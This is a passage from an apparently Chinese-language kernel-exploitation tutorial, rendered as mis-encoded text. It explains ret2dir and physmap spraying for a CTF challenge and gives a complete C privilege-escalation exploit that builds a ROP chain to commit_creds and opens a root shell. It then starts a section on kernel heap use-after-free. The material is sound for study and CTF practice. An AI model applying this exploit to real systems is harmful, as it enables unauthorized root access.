çš„åœ°å€å°±èƒ½è¿›è¡Œåˆ©ç”¨äº†</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æˆ‘ä»¬çš„æ¶æ„æ•°æ®å‘¢ï¼Ÿå¯èƒ½æœ‰çš„äººå°±ä¼šæƒ³åˆ° <code>msg_msg</code> ã€<code>sk_buff</code> ç­‰ä¸€ç³»åˆ—å¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“ï¼Œ<strong>ä½†å…¶å®æˆ‘ä»¬å¹¶ä¸éœ€è¦æ˜¾å¼åœ°åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æ•°æ®ï¼Œè€Œæ˜¯å¯ä»¥é€šè¿‡ä¸€ä¸ªä½äºå†…æ ¸ç©ºé—´ä¸­çš„åœ°å€ç›´æ¥è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„æ•°æ®</strong>â€”â€”é‚£å°±æ˜¯æ˜ å°„äº†æ•´ä¸ªç‰©ç†å†…å­˜çš„ <code>direct mapping area</code></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>æˆ‘ä»¬ä¸ºç”¨æˆ·ç©ºé—´æ‰€åˆ†é…çš„æ¯ä¸€å¼ å†…å­˜é¡µï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­éƒ½èƒ½é€šè¿‡è¿™å—å†…å­˜åŒºåŸŸè®¿é—®åˆ°</strong>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®æ¶æ„æ•°æ®ï¼Œä¹‹åå†åœ¨å†…æ ¸ç©ºé—´çš„è¿™å—åŒºåŸŸä¸­æ‰¾åˆ°æˆ‘ä»¬çš„ç”¨æˆ·ç©ºé—´æ•°æ®å¯¹åº”çš„å†…æ ¸ç©ºé—´åœ°å€å³å¯ï¼Œè¿™ä¾¿æ˜¯ <code>ret2dir</code> â€”â€”<strong>é€šè¿‡å†…æ ¸ç©ºé—´åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´æ•°æ®</strong></p>
<blockquote>
<p>å½“ç„¶ï¼Œä½¿ç”¨ <code>msg_msg</code> æˆ–è€… <code>sk_buff</code> åœ¨å†…æ ¸ç©ºé—´ä¸­å¸ƒç½®æ¶æ„æ•°æ®ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥å¯¹è¿™é¢˜è€Œè¨€æ˜¯å¤šæ­¤ä¸€ä¸¾â€¦</p>
</blockquote>
<p>é‚£ä¹ˆç°åœ¨åˆå‡ºç°ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œ<strong>æˆ‘ä»¬å¦‚ä½•å¾—çŸ¥æˆ‘ä»¬å¸ƒç½®çš„æ¶æ„æ•°æ®åœ¨å†…æ ¸ç©ºé—´ä¸­çš„å¯¹åº”åœ°å€å‘¢ï¼Ÿ</strong>æˆ‘ä»¬æ— æ³•è¿›è¡Œå†…æ ¸ç©ºé—´ä¸­çš„å†…å­˜æœç´¢ï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•ç›´æ¥å¾—çŸ¥æˆ‘ä»¬å¸ƒç½®çš„æ¶æ„æ•°æ®åœ¨å†…æ ¸ç©ºé—´ä¸­çš„åœ°å€</p>
<p><strong>ç­”æ¡ˆæ˜¯ä¸éœ€è¦æœç´¢</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<a target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">åŸè®ºæ–‡</a>ä¸­çš„ä¸€ç§åä¸º <code>physmap spray</code> çš„æ”»å‡»æ‰‹æ³•â€”â€”<strong>ä½¿ç”¨ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ ·çš„ payload</strong>ï¼Œä¹‹åå†éšæœºæŒ‘é€‰ä¸€ä¸ª direct mapping area ä¸Šçš„åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±<strong>æœ‰å¾ˆå¤§çš„æ¦‚ç‡å‘½ä¸­åˆ°æˆ‘ä»¬å¸ƒç½®çš„ payload ä¸Š</strong></p>
<p>ç»ç¬”è€…å®æµ‹å½“æˆ‘ä»¬å–·å°„çš„å†…å­˜é¡µæ•°é‡è¾¾åˆ°ä¸€å®šæ•°é‡çº§æ—¶<strong>æˆ‘ä»¬æ€»èƒ½å‡†ç¡®åœ°åœ¨ direct mapping area é ä¸­åéƒ¨çš„åŒºåŸŸå‘½ä¸­æˆ‘ä»¬çš„æ¶æ„æ•°æ®</strong></p>
<p>æœ€åå°±æ˜¯ gadget çš„æŒ‘é€‰ä¸ rop chain çš„æ„é€ äº†ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥é€šè¿‡å½¢å¦‚ <code>add rsp, val ; ret</code> çš„ gadget è·³è½¬åˆ°å†…æ ¸æ ˆä¸Šçš„ <code>pt_regs</code> ä¸Šï¼Œåœ¨ä¸Šé¢å¸ƒç½®ææƒçš„ rop chainï¼Œä½†åœ¨æœ¬é¢˜å½“ä¸­ <code>pt_regs</code> åªæœ‰ r9 ä¸ r8 ä¸¤ä¸ªå¯„å­˜å™¨å¯ç”¨ï¼Œç¬”è€…æå‰å¯¹å†…æ ¸æ ˆè¿›è¡Œäº†æ¸…ç†â€”â€”</p>
<p><img src="https://s2.loli.net/2022/05/07/xik67DJWKez9FNl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç¼–è¯‘å™¨ä¼˜åŒ–æˆäº† qmemcpyï¼Œå…¶å®ç¬”è€…æºç é‡Œæ˜¯é€ä¸ªå¯„å­˜å™¨èµ‹å€¼çš„</p>
</blockquote>
<p>ä½†å…¶å®ä»…æœ‰ä¸¤ä¸ªå¯„å­˜å™¨ä¹Ÿå¤Ÿç”¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>pop_rsp ; ret</code> çš„ gadget è¿›è¡Œæ ˆè¿ç§»ï¼Œ<strong>å°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´æ‰€å¸ƒç½®çš„æ¶æ„æ•°æ®ä¸Š</strong>ï¼Œéšåæˆ‘ä»¬ç›´æ¥åœ¨æ¶æ„æ•°æ®é åçš„ä½ç½®å¸ƒç½®ææƒé™è½å›ç”¨æˆ·æ€çš„ rop chain å³å¯</p>
<p>ç”±äº buddy system ä»¥é¡µä¸ºå•ä½è¿›è¡Œå†…å­˜åˆ†é…ï¼Œæ‰€ä»¥ç¬”è€…ä¹Ÿä»¥é¡µä¸ºå•ä½è¿›è¡Œ physmap sprayï¼Œä»¥æ±‚èƒ½æ¶ˆè€—æ›´å¤šçš„ç‰©ç†å†…å­˜ï¼Œæé«˜å‘½ä¸­ç‡ï¼Œè¿™é‡Œç¬”è€…æ‡’å¾—å»è®¡ç®—åç§»äº†ï¼Œæ‰€ä»¥åœ¨æ¯å¼ å†…å­˜é¡µä¸Šå¸ƒç½®çš„éƒ½æ˜¯â€œä¸‰æ®µå¼â€çš„ rop chainï¼Œå°†æˆ‘ä»¬è·³è½¬åˆ° <code>pt_regs</code> çš„ gadget åŒæ—¶ç”¨ä½œ slide codeâ€”â€”</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">------------------------</span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret</span><br><span class="hljs-code">...</span><br><span class="hljs-code">add rsp, val ; ret # è¯¥gadgetå¿…å®šä¼šå‘½ä¸­ä¸‹ä¸€ä¸ªåŒºåŸŸä¸­çš„ä¸€æ¡retï¼Œä¹‹åä¾¿èƒ½å¹³ç¼“åœ°â€œæ»‘â€åˆ°å¸¸è§„çš„ææƒ rop ä¸Š</span><br><span class="hljs-code">------------------------</span><br>ret<br>ret<br><span class="hljs-bullet">...</span><br><span class="hljs-bullet"></span><span class="hljs-section">ret</span><br><span class="hljs-section">------------------------</span><br><span class="hljs-section">common root ROP chain</span><br><span class="hljs-section">------------------------</span><br></code></pre></td></tr></table></figure>

<h3 id="â‘¢-final-exploit"><a href="#â‘¢-final-exploit" class="headerlink" title="â‘¢ final exploit"></a>â‘¢ final exploit</h3><p>æœ€åçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">size_t</span>  prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">size_t</span>  commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-type">size_t</span>  init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">void</span>    (*kgadget_ptr)(<span class="hljs-type">void</span>);<br><span class="hljs-type">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span>  page_size;<br><span class="hljs-type">size_t</span>     try_hit;<br><span class="hljs-type">int</span>     dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">constructROPChain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    saveStatus();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-comment">// construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    constructROPChain(physmap_spray_arr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">// spray physmap, so that we can easily hit one of them</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            errExit(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ç¨³å®šææƒ</p>
<p><img src="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x04-Kernel-Heap-Use-After-Free"><a href="#0x04-Kernel-Heap-Use-After-Free" class="headerlink" title="0x04.Kernel Heap - Use After Free"></a>0x04.Kernel Heap - Use After Free</h1><p>UAF å³ Use After Freeï¼Œé€šå¸¸æŒ‡çš„æ˜¯<strong>å¯¹äºé‡Šæ”¾åæœªé‡ç½®çš„å‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨</strong>ï¼Œæ­¤å‰åœ¨ç”¨æˆ·æ€ä¸‹çš„ heap é˜¶æ®µå¯¹äº ptmalloc çš„åˆ©ç”¨å¾ˆå¤šéƒ½æ˜¯åŸºäºUAFæ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨</p>
<p>åœ¨ CTF å½“ä¸­ï¼Œå†…æ ¸çš„â€œå †å†…å­˜â€ä¸»è¦æŒ‡çš„æ˜¯çº¿æ€§æ˜ å°„åŒºï¼ˆdirect mapping areaï¼‰ï¼Œå¸¸ç”¨çš„åˆ†é…å‡½æ•° kmalloc ä»æ­¤å¤„åˆ†é…å†…å­˜ï¼Œå¸¸ç”¨çš„åˆ†é…å™¨ä¸º slubï¼Œè‹¥æ˜¯åœ¨ kernel ä¸­å­˜åœ¨ç€å‚æ‚¬æŒ‡é’ˆï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä»¥æ­¤å®Œæˆå¯¹ slab&#x2F;slub å†…å­˜åˆ†é…å™¨çš„åˆ©ç”¨ï¼Œé€šè¿‡ Kernel UAF å®Œæˆææƒ</p>
<p>slub åˆ†é…å™¨çš„ç»“æ„ç¬”è€…åœ¨ <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/">kernel pwn å…¥é—¨ç¬”è®° - I</a> ä¸­å·²ç»è¿›è¡Œç®€è¦å™è¿°ï¼Œè‹¥æ˜¯ä¸è®°å¾—äº†å¯ä»¥å›å»çœ‹çœ‹ï¼ˆç¬‘ï¼‰</p>
<h2 id="Pre-å†…æ ¸å †åˆ©ç”¨ä¸ç»‘æ ¸"><a href="#Pre-å†…æ ¸å †åˆ©ç”¨ä¸ç»‘æ ¸" class="headerlink" title="Pre. å†…æ ¸å †åˆ©ç”¨ä¸ç»‘æ ¸"></a>Pre. å†…æ ¸å †åˆ©ç”¨ä¸ç»‘æ ¸</h2><p>slub allocator ä¼šä¼˜å…ˆä»å½“å‰æ ¸å¿ƒçš„ <code>kmem_cache_cpu</code> ä¸­è¿›è¡Œå†…å­˜åˆ†é…ï¼Œåœ¨å¤šæ ¸æ¶æ„ä¸‹å­˜åœ¨å¤šä¸ª <code>kmem_cache_cpu</code> ï¼Œç”±äºè¿›ç¨‹è°ƒåº¦ç®—æ³•ä¼šä¿æŒæ ¸å¿ƒé—´çš„è´Ÿè½½å‡è¡¡ï¼Œå› æ­¤æˆ‘ä»¬çš„ exp è¿›ç¨‹å¯èƒ½ä¼šè¢«åœ¨ä¸åŒçš„æ ¸å¿ƒä¸Šè¿è¡Œï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†åˆ©ç”¨è¿‡ç¨‹ä¸­ kernel object çš„åˆ†é…æœ‰å¯èƒ½ä¼šæ¥è‡ªä¸åŒçš„ <code>kmem_cache_cpu</code> ï¼Œè¿™ä½¿å¾—åˆ©ç”¨æ¨¡å‹å˜å¾—å¤æ‚ï¼Œä¹Ÿé™ä½äº†æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡</p>
<blockquote>
<p>æ¯”å¦‚è¯´ä½ åœ¨ core 0 ä¸Šæ•´äº†ä¸ª double freeï¼Œå‡†å¤‡ä¸‹ä¸€æ­¥åˆ©ç”¨æ—¶ exp è·‘åˆ° core 1å»äº†ï¼Œé‚£å°±å¾ˆå®¹æ˜“è®©äººæ‘¸ä¸ç€å¤´è„‘ :ï¼ˆ</p>
</blockquote>
<p>å› æ­¤ä¸ºäº†ä¿è¯æ¼æ´åˆ©ç”¨çš„ç¨³å®šï¼Œ<strong>æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„è¿›ç¨‹ç»‘å®šåˆ°ç‰¹å®šçš„æŸä¸ª CPU æ ¸å¿ƒä¸Š</strong>ï¼Œè¿™æ · slub allocator çš„æ¨¡å‹å¯¹æˆ‘ä»¬è€Œè¨€ä¾¿ç®€åŒ–æˆäº† <code>kmem_cache_node + kmem_cache_cpu</code> ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ›´åŠ æ–¹ä¾¿åœ°è¿›è¡Œæ¼æ´åˆ©ç”¨</p>
<p>ç°ç¬”è€…ç»™å‡ºå¦‚ä¸‹å°† exp è¿›ç¨‹ç»‘å®šè‡³æŒ‡å®šæ ¸å¿ƒçš„æ¨¡æ¿ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Pre2-é€šç”¨-kmalloc-flag"><a href="#Pre2-é€šç”¨-kmalloc-flag" class="headerlink" title="Pre2. é€šç”¨ kmalloc flag"></a>Pre2. é€šç”¨ kmalloc flag</h2><p><code>GFP_KERNEL</code> ä¸ <code>GFP_KERNEL_ACCOUNT</code>  æ˜¯å†…æ ¸ä¸­æœ€ä¸ºå¸¸è§ä¸é€šç”¨çš„åˆ†é… flagï¼Œå¸¸è§„æƒ…å†µä¸‹ä»–ä»¬çš„åˆ†é…éƒ½æ¥è‡ªåŒä¸€ä¸ª <code>kmem_cache</code> â€”â€”å³é€šç”¨çš„ <code>kmalloc-xx</code> </p>
<p>è¿™ä¸¤ç§ flag çš„åŒºåˆ«ä¸»è¦åœ¨äº <code>GFP_KERNEL_ACCOUNT</code> æ¯” <code>GFP_KERNEL</code> å¤šäº†ä¸€ä¸ªå±æ€§â€”â€”<strong>è¡¨ç¤ºè¯¥å¯¹è±¡ä¸æ¥è‡ªç”¨æˆ·ç©ºé—´çš„æ•°æ®ç›¸å…³è”</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¸å¦‚ <code>msg_msg</code> ã€<code>pipe_buffer</code>ã€<code>sk_buffçš„æ•°æ®åŒ…</code> çš„åˆ†é…ä½¿ç”¨çš„éƒ½æ˜¯ <code>GFP_KERNEL_ACCOUNT</code> ï¼Œè€Œ <code>ldt_struct</code> ã€<code>packet_socket</code> ç­‰ä¸ç”¨æˆ·ç©ºé—´æ•°æ®æ²¡æœ‰ç›´æ¥å…³è”çš„ç»“æ„ä½“åˆ™ä½¿ç”¨ <code>GFP_KERNEL</code></p>
<p>åœ¨5.9 ç‰ˆæœ¬ä¹‹å‰<code>GFP_KERNEL</code> ä¸ <code>GFP_KERNEL_ACCOUNT</code> å­˜åœ¨éš”ç¦»æœºåˆ¶ï¼Œåœ¨ <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792">è¿™ä¸ª commit</a> ä¸­å–æ¶ˆäº†éš”ç¦»æœºåˆ¶ï¼Œè‡ªå†…æ ¸ç‰ˆæœ¬ 5.14 èµ·ï¼Œåœ¨ <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552">è¿™ä¸ª commit</a> å½“ä¸­åˆé‡æ–°å¼•å…¥ï¼š</p>
<ul>
